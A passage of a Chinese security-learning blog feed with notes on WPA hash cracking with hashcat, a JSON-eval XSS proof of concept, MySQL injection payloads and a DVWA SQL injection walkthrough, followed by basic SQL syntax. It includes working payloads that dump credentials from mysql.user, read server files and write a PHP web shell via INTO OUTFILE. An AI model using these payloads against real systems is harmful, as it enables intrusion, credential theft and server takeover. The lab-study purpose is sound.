<p>cudaHashcat64.exe –hash-type 2500 –attack-mode 0  samsing-01.hccap 2(1).txt 2(2).txt 2(3).txt 2(4).txt 2(5).txt 2(6).txt 2(7).txt 2(8).txt 2(9).txt 2(10).txt 2(11).txt 2(12).txt 2(13).txt 2(14).txt 2(15).txt 2(16).txt 2(17).txt 2(18).txt 2(19).txt 2(21).txt 2(22).txt 2(23).txt 2(24).txt 2(25).txt 2(26).txt 2(27).txt 2(28).txt 2(29).txt 2(30).txt 2(31).txt 2(32).txt</p>
</blockquote>
<p>手册(manual)</p>
<blockquote>
<p>[hashcat-manual]<a href="https://hashcat.net/wiki/doku.php?id=hashcat" target="_blank" rel="external">https://hashcat.net/wiki/doku.php?id=hashcat</a></p>
</blockquote>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h3><p><a href="http://www.aircrack-ng.org/doku.php?id=airmon-ng" target="_blank" rel="external">airmon-ng</a><br><a href="http://www.secbox.cn/hacker/wireless/4877.html" target="_blank" rel="external">secbox</a><br><a href="http://www.kali.org.cn/thread-17187-1-1.html" target="_blank" rel="external">kali.org</a><br><a href="http://unix.stackexchange.com/questions/162088/why-airmon-ng-does-not-create-a-monitoring-interface" target="_blank" rel="external">stackexchange</a><br><a href="http://www.freebuf.com/tools/75517.html" target="_blank" rel="external">Frebuf</a><br><a href="http://www.hackingtutorials.org/wifi-hacking-tutorials/pixie-dust-attack-wps-in-kali-linux-with-reaver/" target="_blank" rel="external">hackingtutorials</a><br><a href="http://netsecurity.51cto.com/art/201105/264844_all.htm" target="_blank" rel="external">51cto</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[读书笔记--web安全测试]]></title>
      <url>http://csser.work/11/13/2015/book-web%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</url>
      <content type="html"><![CDATA[<h3 id="wget-作镜像"><a href="#wget-作镜像" class="headerlink" title="wget 作镜像"></a>wget 作镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://a.com -r -R <span class="string">'*.gif,*.jpg,*.png,*.css,*.js'</span></span><br><span class="line">wget http://b.com -r -A <span class="string">'*.html,*.htm,*.php,*.asp,*.aspx,*.jsp,*do'</span></span><br></pre></td></tr></table></figure>
<p>-r 递归扫描 –depth 1 只扫到一级目录<br>-A  accept 接受的文件类型<br>-R  reject  拒绝的文件类型<br>–http-user –http-password   身份认证<br>–save-cookies  –load-cookies    存储/加载cookies<br>–log   存储日志</p>
<h3 id="openSSL-的base64"><a href="#openSSL-的base64" class="headerlink" title="openSSL 的base64"></a>openSSL 的base64</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#decode</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'b3BlbnNzbA=='</span> | openssl base64 <span class="_">-d</span>   <span class="comment">#-d decode</span></span><br><span class="line"><span class="comment">#encode</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">'openssl'</span> | openssl base64 <span class="_">-e</span>   <span class="comment">#-e encode</span></span><br><span class="line"><span class="comment">#注意 -n必需        -n就表示不输入回车符</span></span><br><span class="line"><span class="comment">#code with file</span></span><br><span class="line">openssl base64 <span class="_">-e</span>/<span class="_">-d</span> -in   input.txt  -out output.txt</span><br></pre></td></tr></table></figure>
<p>cookie 一般使用base64编码</p>
<p>openssl还<code>支持rsa md2 md5 sha sha1 sha224 sha256 sha384 sha512 des3</code>编码,棒!</p>
<h4 id="openssl-md5"><a href="#openssl-md5" class="headerlink" title="openssl_md5"></a>openssl_md5</h4><p>a.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#a</span></span><br><span class="line">1. openssl </span><br><span class="line">2. 输入md5后回车</span><br><span class="line">3. 接着输入123456,不要输入回车.然后按3次ctrl+d.</span><br><span class="line">4. 输出密文</span><br><span class="line"><span class="comment">#b</span></span><br><span class="line"> <span class="built_in">echo</span> -n 123456 | openssl md5</span><br></pre></td></tr></table></figure></p>
<p>其他同理~</p>
<h4 id="小游戏"><a href="#小游戏" class="headerlink" title="小游戏"></a>小游戏</h4><p><a href="http://fun.coolshell.cn/tree.html" target="_blank" rel="external">Binary Tree</a><br>手画画了好久..</p>
<h3 id="JSON-attack-xss"><a href="#JSON-attack-xss" class="headerlink" title="JSON attack xss"></a>JSON attack xss</h3><p>应该算是个存储型吧<br>AJAX组件通过JavaScript对象符号JSON来接受输入,即<code>JSON内的数据接受javascript的解析</code></p>
<h4 id="JSON解析原理"><a href="#JSON解析原理" class="headerlink" title="JSON解析原理:"></a>JSON解析原理:</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse()</span><br><span class="line"><span class="comment">//解析JSON字符串, 可以选择改变前面解析后的值及其属性,然后返回解析的值.</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify()</span><br><span class="line"><span class="comment">//返回指定值的 JSON 字符串,可以自定义只包含某些特定的属性或替换属性值.</span></span><br><span class="line"><span class="keyword">var</span> code = <span class="string">'"nihao"'</span>;</span><br><span class="line"><span class="built_in">JSON</span>.parse(code);</span><br><span class="line"><span class="built_in">eval</span>(code);</span><br></pre></td></tr></table></figure>
<h4 id="example"><a href="#example" class="headerlink" title="example:"></a>example:</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"menu"</span>:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">"address"</span>:</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"line1"</span>:<span class="string">"User Inputs"</span>,</span><br><span class="line">      <span class="attr">"line2"</span>:<span class="string">"Beijing"</span>,</span><br><span class="line">      <span class="attr">"line3"</span>:<span class="string">"Shanghai"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- User Inputs: --&gt;</span><br><span class="line">",                        //闭合</span><br><span class="line">xxx1:alert(/xss/),    //xxx1,xxx2则为语法需要,任意即可</span><br><span class="line">xxx2:"        //闭合</span><br></pre></td></tr></table></figure>
<h4 id="解析之后"><a href="#解析之后" class="headerlink" title="解析之后"></a>解析之后</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(&#123;</span><br><span class="line">  <span class="string">"menu"</span>:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">"address"</span>:</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"line1"</span>:<span class="string">""</span>,xxx1:alert(<span class="regexp">/xss/</span>),xxx2:<span class="string">" "</span>,</span><br><span class="line">      <span class="string">"line2"</span>:<span class="string">"Beijing"</span>,</span><br><span class="line">      <span class="string">"line3"</span>:<span class="string">"Shanghai"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>Other :<br>查找网站平台/框架<br>  <meta>  注释 页头信息(header)</p>
<h3 id="Pending"><a href="#Pending" class="headerlink" title="Pending"></a>Pending</h3><ol>
<li>curl 自动化xss检测 &amp;&amp; 目录遍历    P137 单独blog</li>
<li>Command Injection</li>
<li>Xpath Injection</li>
</ol>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[MySQL表段,字段查询]]></title>
      <url>http://csser.work/11/12/2015/sql-mysql-crake/</url>
      <content type="html"><![CDATA[<h2 id="information-schema数据库结构"><a href="#information-schema数据库结构" class="headerlink" title="information_schema数据库结构"></a>information_schema数据库结构</h2><h3 id="information-schema-tables"><a href="#information-schema-tables" class="headerlink" title="information_schema.tables"></a>information_schema.tables</h3><p><code>数据库和表tables的关系库</code><br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+----TABLE_SCHEMA-------TABLE_NAME-------+</span></span><br><span class="line"><span class="section">|----所有数据库名 ------- 所有的表名 -------|   </span><br><span class="line">+----------------------------------------+</span></span><br></pre></td></tr></table></figure></p>
<h3 id="information-schema-columns"><a href="#information-schema-columns" class="headerlink" title="information_schema.columns"></a>information_schema.columns</h3><p><code>数据库,表和字段columns的关系库</code><br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+----TABLE_SCHEMA-------TABLE_NAME-------COLUMN_NAME-----+</span></span><br><span class="line"><span class="section">|----所有数据库名 ------- 所有的表名 ------ 所有的字段名 ----|</span><br><span class="line">+--------------------------------------------------------+</span></span><br></pre></td></tr></table></figure></p>
<h2 id="mysql-user"><a href="#mysql-user" class="headerlink" title="mysql.user"></a>mysql.user</h2><p>数据库连接所检测的帐号密码<br><code>Host</code> <code>User</code> <code>Password</code></p>
<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">by blackbap.org</span><br><span class="line">爆所有数据库名：</span><br><span class="line"> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> table_schema) <span class="keyword">from</span> information_schema.columns</span><br><span class="line">爆所有表段名称：</span><br><span class="line"> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> table_namer) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema(表名)=<span class="number">0x64625F6368696E615F717562616E5F636E</span>      //表名写成<span class="number">16</span>进制就不需要添加单引号了</span><br><span class="line">爆<span class="keyword">admin</span>表里面所有字段名称：</span><br><span class="line"> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x61646D696E</span></span><br></pre></td></tr></table></figure>
<h2 id="insert类型注入"><a href="#insert类型注入" class="headerlink" title="insert类型注入"></a>insert类型注入</h2><p>例如文件上传中的文件名注入.etc</p>
<h3 id="0x01-爆版本号"><a href="#0x01-爆版本号" class="headerlink" title="0x01 爆版本号"></a>0x01 爆版本号</h3><p>[‘+]  concat( (select version() ))  [+’]</p>
<h3 id="0x02-爆数据库-逐字"><a href="#0x02-爆数据库-逐字" class="headerlink" title="0x02 爆数据库(逐字)"></a>0x02 爆数据库(逐字)</h3><ol>
<li><p>长度</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+concat( ( <span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>()) )+<span class="string">'</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>逐字爆库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">'+concat( ( selecselectt ascii((substr(database(),1,1))) ) )+'</span><br><span class="line">'+concat( ( selecselectt ascii((substr(database(),2,1))) ) )+'</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>….etc</p>
<h3 id="0x03-逐字爆表–查表原理"><a href="#0x03-逐字爆表–查表原理" class="headerlink" title="0x03 逐字爆表–查表原理"></a>0x03 逐字爆表–查表原理</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">concat( (</span><br><span class="line">  <span class="keyword">select</span> <span class="keyword">ascii</span>(</span><br><span class="line">    <span class="keyword">substr</span>(</span><br><span class="line">      (selselectect table_name frfromom information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">      ,<span class="number">1</span>,<span class="number">1</span>)) ) )</span><br><span class="line"><span class="comment">-- limit 0,1 是因为数据库可能会有很多表,limit限制显示的行数</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> 即可查第二个表,后面同理</span><br></pre></td></tr></table></figure>
<h3 id="0x04-逐字爆字段–查表原理"><a href="#0x04-逐字爆字段–查表原理" class="headerlink" title="0x04 逐字爆字段–查表原理"></a>0x04 逐字爆字段–查表原理</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">concat((</span><br><span class="line">  <span class="keyword">select</span> <span class="keyword">ascii</span>( </span><br><span class="line">      <span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'爆出来的表名'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    ,<span class="number">1</span>,<span class="number">1</span>))</span><br><span class="line">  ))</span><br></pre></td></tr></table></figure>
<h2 id="access"><a href="#access" class="headerlink" title="access:"></a>access:</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#top x:      选取前面x行  非Mysql语法,mysql可以用limit代替</span><br><span class="line">1=convert(int,(select+top+1+table_name+from+information_schema.tables))</span><br><span class="line">1=convert(int,(select+top+1+table_name+from+information_schema.tables where table_name not in('第一个表名')))</span><br><span class="line">1=convert(int,(select+top+1+table_name+from+information_schema.tables where table_name not in('第二个表名','第一个表名')))</span><br></pre></td></tr></table></figure>
<p>可以学习过滤语句 <code>where 字段名 not in(&#39;xxx1&#39;,&#39;xxx2&#39;[,&#39;xxxn&#39;]);</code></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[DVWA-SQLInject]]></title>
      <url>http://csser.work/11/10/2015/sql-injection-dvwa/</url>
      <content type="html"><![CDATA[<h1 id="DVWA笔记"><a href="#DVWA笔记" class="headerlink" title="DVWA笔记"></a>DVWA笔记</h1><h2 id="0x1-Low-Injection"><a href="#0x1-Low-Injection" class="headerlink" title="0x1 Low Injection"></a>0x1 Low Injection</h2><h3 id="0x00-order-by-x-desc"><a href="#0x00-order-by-x-desc" class="headerlink" title="0x00  order by x desc"></a>0x00  order by x desc</h3><p>判断是否存在注入<br>可以判断<code>字段</code>数</p>
<h3 id="0x01-union-select-1-2-3-–"><a href="#0x01-union-select-1-2-3-–" class="headerlink" title="0x01 union select 1,2,3  –"></a>0x01 union select 1,2,3  –</h3><p>用来判断在web显示的字段长度,长度不匹配就会返回错误<br><code>如果知道字段和表</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> user_id =<span class="number">1</span>)<span class="comment">--     '</span></span><br></pre></td></tr></table></figure></p>
<h3 id="0x02-获取库名"><a href="#0x02-获取库名" class="headerlink" title="0x02 获取库名"></a>0x02 获取库名</h3><p>一旦可以进行union操作,即可利用information_schema.schemata<br>union虽然限制了显示内容,但是我们可以利用concat_ws()进行字符串连接增加显示<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  1'union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">concat_ws</span>(<span class="built_in">char</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="keyword">version</span>()))<span class="comment">--            </span></span><br><span class="line"><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p>concat_ws(‘ ‘,      ‘a’,’b’)     字符串连接函数,用空格连接a和b<br>char(32,58,32)                     unicode转字符<br>user()              返回当前用户<br>database()     当前数据库<br>version()         Mysql版本</p>
<h3 id="0x03-获取版本信息-数据库"><a href="#0x03-获取版本信息-数据库" class="headerlink" title="0x03 获取版本信息 数据库"></a>0x03 获取版本信息 数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1'union <span class="keyword">select</span> <span class="number">1</span>,schema_name <span class="keyword">from</span> information_schema.schemata<span class="comment">-- </span></span><br><span class="line"><span class="string">'</span></span><br></pre></td></tr></table></figure>
<p>information_schema.schemata     这个表显示的是所有的表名</p>
<h3 id="0x04-显示当前的用户名和密码"><a href="#0x04-显示当前的用户名和密码" class="headerlink" title="0x04 显示当前的用户名和密码"></a>0x04 显示当前的用户名和密码</h3><p>concat(user, ‘:’ , password);                 //和concat_ws()有所不一样,直接连接<br>1’union select 1,(concat(user,’:’,password)) from mysql.user–<br>//读取mysql数据库中user表的user和password字段内容</p>
<h3 id="0x05-读取系统文件"><a href="#0x05-读取系统文件" class="headerlink" title="0x05 读取系统文件"></a>0x05 读取系统文件</h3><p>load_file(‘../../xx.txt’);          文件目录不能无限../<br>load_file(‘E:/xampp/xx.text’);      //可以直接用这个方法</p>
<h3 id="0x06-注入点直接写入shell"><a href="#0x06-注入点直接写入shell" class="headerlink" title="0x06 注入点直接写入shell"></a>0x06 注入点直接写入shell</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1'union select 1,     "&lt;?php</span><br><span class="line">system($_GET('hexo'));    //hexo作为一个变量</span><br><span class="line">?&gt;" into outfile '../../shell.php'--</span><br></pre></td></tr></table></figure>
<h2 id="0x1-Low-Blind-Injection"><a href="#0x1-Low-Blind-Injection" class="headerlink" title="0x1 Low Blind Injection"></a>0x1 Low Blind Injection</h2><h3 id="0x01-判断是否存在注入点"><a href="#0x01-判断是否存在注入点" class="headerlink" title="0x01  判断是否存在注入点"></a>0x01  判断是否存在注入点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(4)<span class="comment">-- </span></span><br><span class="line">'</span><br></pre></td></tr></table></figure>
<p>如果存在注入点,网页会在4秒之后才会有反应</p>
<h3 id="0x02-后面"><a href="#0x02-后面" class="headerlink" title="0x02 后面"></a>0x02 后面</h3><p>和普通的一样,把最后一个换成<code>sleep(5)</code><br>sleep()如果sleep无效试试benchmark()[MySQL5.0以下]//这个没试过,以后直接查询手册即可</p>
<p>其他的也都差不多</p>
<h3 id="0x03-Medium-amp-High"><a href="#0x03-Medium-amp-High" class="headerlink" title="0x03 Medium &amp; High"></a>0x03 Medium &amp; High</h3><p>Medium:   @直接关闭了错误回显<br>//这个的话盲注依然可以,但是需要耐心了<br>High:   检测是否被攻击,然后0-5秒内自动sleep()<br>//也需要时间把,更多而已,设成10秒就可以很明显了,结合F12的network看一下就行了</p>
<h3 id="SQLMAP基本用法"><a href="#SQLMAP基本用法" class="headerlink" title="SQLMAP基本用法:"></a>SQLMAP基本用法:</h3><p>定了注入的URL<br>-p 参数指定了注入的参数，这里指定了id，也就是通过URL中的id参数注入，遇到多参数的URL时候这个-p就十分有用了。<br>–current-db，让SQLMAP列举出当前的数据库名称<br>-v 这个参数这里并没有使用到，这个参数会改变输出log的详细程度，一般默认即可，如果是学习或是想查看sqlmap使用的payload，可以使用-v 3参数。<br>–level 这个很有bi用咯，我个人理解是提高检测的等级，也就是说level 3会比level 1使用更多的payload进行测试。</p>
<h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><p>id = -1 也可以实现报错,在没有引号的情况跟之下23w32217uy7yuhjnm 65ythggb</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Web漏洞实战教程 DVWA的使用和漏洞分析</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[MySQL基础]]></title>
      <url>http://csser.work/10/30/2015/sql-mySql-1/</url>
      <content type="html"><![CDATA[<h2 id="基本数据查询"><a href="#基本数据查询" class="headerlink" title="基本数据查询"></a>基本数据查询</h2><p>1.创建CREATE<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tablename (<span class="keyword">field</span> <span class="keyword">type</span> [(<span class="keyword">size</span>)] [<span class="keyword">NOT</span> <span class="literal">NULL</span>]&#123;, <span class="keyword">field</span> <span class="keyword">type</span> [(<span class="keyword">size</span>)] [<span class="keyword">NOT</span> <span class="literal">NULL</span>]...&#125;[,PRIMARY <span class="keyword">KEY</span>(<span class="keyword">field</span>&#123;,field...&#125;)]);</span><br></pre></td></tr></table></figure></p>
<p>2.选择SELECT<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> <span class="keyword">id</span> &lt; <span class="number">20</span> <span class="keyword">AND</span> age &gt; <span class="number">25</span>;</span><br></pre></td></tr></table></figure></p>
<p>3.范围BETWEEN..AND<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> <span class="keyword">id</span> <span class="keyword">BETWEEN</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">10</span>;</span><br></pre></td></tr></table></figure></p>
<p>4.模糊查询LIKE<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM students WHERE name LIKE '%son';  #比如找一个名字后缀为'son'的人</span><br></pre></td></tr></table></figure></p>
<p>LIKE通配符:</p>
<pre><code>%   0或者更多字符
_   任意一个字符
[]  指定范围内的任意单个字符
[^] 不再指定范围内的任意单个字符
</code></pre><p>Example:</p>
<pre><code>Like&quot;[CK]%&quot; 返回以 C 或者 K 开始的任意字符串
Like&quot;[S-V]ing&quot; 返回长为 4 个字符的字符串,结尾是&quot;ing&quot;,开始是从 S 到 V
Like&quot;M[^c]%&quot; 返回以&quot;M&quot;开始且第二个字符不是&quot;c&quot;的任意字符串
</code></pre><p>5.创建昵称AS<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">AS</span> 姓名 <span class="keyword">FROM</span> students ;</span><br></pre></td></tr></table></figure></p>
<p>6.查询结果排序ORDER BY ASC升序DESC降序<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM students WHERE name LIKE '%son' ORDER BY age ASC,id DESC;#age优先排列</span><br></pre></td></tr></table></figure></p>
<p>7.统计COUNT<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(id) FROM students; #查询id字段的行数</span><br></pre></td></tr></table></figure></p>
<p>8.分组GROUP BY<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM students GROUP BY age (HAVING id &gt; 5);  #括号可略,添加附加条件</span><br></pre></td></tr></table></figure></p>
<p>9.联合查询UNION<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 前提是两个表字段一样--</span><br><span class="line">SELECT * FROM students UNION SELECT * FROM students_bak;  #合并两个表的查询记录,Veen图的合并</span><br><span class="line">-- 默认记录不重复,不过可以使用UNION ALL显示所有记录</span><br><span class="line">SELECT * FROM students UNION ALL SELECT * FROM students_bak;</span><br></pre></td></tr></table></figure></p>
<p>10.子查询/嵌套查询<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 该查询ORDER BY无效--</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> <span class="keyword">name</span> = (<span class="keyword">SELECT</span> age <span class="keyword">FROM</span> <span class="keyword">WHERE</span> age = <span class="number">20</span>);</span><br></pre></td></tr></table></figure></p>
<p><a href="http://www.jellythink.com/archives/932" target="_blank" rel="external">例1</a><br><a href="http://www.5idev.com/p-mysql_subquery.shtml" target="_blank" rel="external">例2</a></p>
<h2 id="数据更新语句"><a href="#数据更新语句" class="headerlink" title="数据更新语句"></a>数据更新语句</h2><ol>
<li><p>INSERT<br>–&gt; VALUES结构(插入单条记录)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tablename [(colname&#123;,colname...&#125;)]&#123;<span class="keyword">VALUES</span> (expr|<span class="literal">NULL</span>&#123;,expr|NULL....&#125;)|Subquery&#125;</span><br><span class="line"><span class="comment">-- Example:</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> school.stuents(<span class="string">'s_name'</span>,<span class="string">'s_age'</span>)</span><br><span class="line">  <span class="keyword">VALUES</span> (<span class="string">'xiaobai'</span>,<span class="string">'20'</span>);</span><br><span class="line"><span class="comment">-- OR</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> school.students(<span class="string">'s_id'</span>,<span class="string">'s_name'</span>,<span class="string">'s_age'</span>)</span><br><span class="line">  <span class="keyword">VALUES</span> (<span class="literal">NULL</span>, <span class="string">'laoli'</span>, <span class="string">'10'</span>);</span><br></pre></td></tr></table></figure>
<p>–&gt;子查询Subquery(可插入多条记录)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> newStudens</span><br><span class="line">  <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> <span class="keyword">name</span> = <span class="string">'laowang'</span>;</span><br><span class="line"><span class="comment">-- 往newStudents表中插入students的一个字段(改为age就能插入多个了..)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>UPDATE<br>–&gt; grammar </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> tablename</span><br><span class="line">  <span class="keyword">SET</span> colname= &#123;expr|<span class="literal">NULL</span>|(subquery)&#125;</span><br><span class="line">    &#123;, colname= &#123;expr|<span class="literal">NULL</span>|(subquery).....&#125;&#125;</span><br><span class="line">      [WH ERE search_condition]   <span class="comment">-- 子查询</span></span><br><span class="line">  <span class="comment">-- -&gt;Example:</span></span><br><span class="line">  <span class="keyword">UPDATE</span> students</span><br><span class="line">    <span class="keyword">SET</span> age = age + <span class="number">10</span></span><br><span class="line">      <span class="keyword">WHERE</span> <span class="keyword">name</span> = <span class="string">'doubi'</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>DELETE</p>
